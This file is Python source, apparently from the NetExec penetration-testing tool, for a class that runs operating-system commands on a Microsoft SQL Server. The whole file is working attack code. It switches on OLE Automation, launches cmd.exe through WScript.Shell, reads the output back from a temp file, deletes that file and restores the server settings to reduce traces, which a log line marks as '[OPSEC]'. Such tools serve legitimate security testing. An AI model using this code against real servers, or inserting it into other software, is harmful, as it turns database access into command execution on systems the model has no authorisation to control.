from nxc.helpers.misc import gen_random_string


class OLEEXEC:
    def __init__(self, connection, logger):
        self.mssql_conn = connection
        self.logger = logger
        self.default_output_dir = "c:\\Windows\\Temp\\"
        self.output_file = f"{gen_random_string(6)}.log"

        # Store the original state of options that have to be enabled/disabled in order to restore them later
        self.backuped_options = {}

    def execute(self, command, get_output, clr_assembly=None):
        self.backup_and_enable("advanced options")
        self.backup_and_enable("Ole Automation Procedures")

        command_query = f"""
        DECLARE @shell INT;
        EXEC sp_oacreate 'WScript.Shell', @shell OUT;
        EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c "{command}" > {self.default_output_dir}{self.output_file}', 0, 1;;
        EXEC sp_oadestroy @shell;
        """
        self.logger.debug(f"Attempting to execute query: {command_query}")
        raw = self.mssql_conn.sql_query(command_query)
        if self.mssql_conn.lastError:
            self.logger.debug(f"Error running {command_query} : {self.mssql_conn.lastError}")

        read_answer_query = f"""
        DECLARE @fso INT, @file INT, @line VARCHAR(8000), @result VARCHAR(MAX), @eof INT;
        SET @result = '';

        EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUT;
        EXEC sp_OAMethod @fso, 'OpenTextFile', @file OUT, '{self.default_output_dir}{self.output_file}', 1;

        WHILE 1=1
        BEGIN
            EXEC sp_OAGetProperty @file, 'AtEndOfStream', @eof OUT;
            IF @eof = 1 BREAK;
            EXEC sp_OAMethod @file, 'ReadLine', @line OUT;
            SET @result = @result + ISNULL(@line, '') + CHAR(10);
        END;

        EXEC sp_OAMethod @fso, 'Close', NULL;
        EXEC sp_OADestroy @file;
        EXEC sp_OADestroy @fso;

        SELECT @result;
        """
        self.logger.debug(f"Attempting to execute query: {read_answer_query}")
        raw = self.mssql_conn.sql_query(read_answer_query)
        if self.mssql_conn.lastError:
            self.logger.debug(f"Error running the command execution query : {self.mssql_conn.lastError}")

        self.logger.debug(f"Raw results from query: {raw}")
        output = raw[0][""].decode("cp850").strip()

        # Delete output file
        delete_query = f"""
        DECLARE @fso INT;
        EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUT;
        EXEC sp_OAMethod @fso, 'DeleteFile', NULL, '{self.default_output_dir}{self.output_file}';
        EXEC sp_OADestroy @fso;
        """
        self.logger.debug(f"Attempting to execute query: {delete_query}")
        raw = self.mssql_conn.sql_query(delete_query)
        if self.mssql_conn.lastError:
            self.logger.debug(f"Error while deleting '{self.default_output_dir}{self.output_file}': {self.mssql_conn.lastError}")

        self.restore("Ole Automation Procedures")
        self.restore("advanced options")
        return output

    def restore(self, option):
        try:
            if not self.backuped_options[option]:
                self.logger.debug(f"Option '{option}' was not enabled originally, attempting to disable it.")
                query = f"EXEC master.dbo.sp_configure '{option}', 0;RECONFIGURE;"
                self.logger.debug(f"Executing query: {query}")
                self.mssql_conn.sql_query(query)
            else:
                self.logger.debug(f"Option '{option}' was originally enabled, leaving it enabled.")
        except Exception as e:
            self.logger.error(f"[OPSEC] Error when attempting to restore option '{option}': {e}")

    def backup_and_enable(self, option):
        try:
            self.backuped_options[option] = self.is_option_enabled(option)
            if not self.backuped_options[option]:
                self.logger.debug(f"Option '{option}' is disabled, attempting to enable it.")
                query = f"EXEC master.dbo.sp_configure '{option}', 1;RECONFIGURE;"
                self.logger.debug(f"Executing query: {query}")
                self.mssql_conn.sql_query(query)
            else:
                self.logger.debug(f"Option '{option}' is already enabled.")
        except Exception as e:
            self.logger.error(f"Error when checking/enabling option '{option}': {e}")

    def is_option_enabled(self, option):
        query = f"EXEC master.dbo.sp_configure '{option}';"
        self.logger.debug(f"Checking if {option} is enabled: {query}")
        result = self.mssql_conn.sql_query(query)
        # Assuming the query returns a list of dictionaries with 'config_value' as the key
        self.logger.debug(f"{option} check result: {result}")
        return bool(result and result[0]["config_value"] == 1)
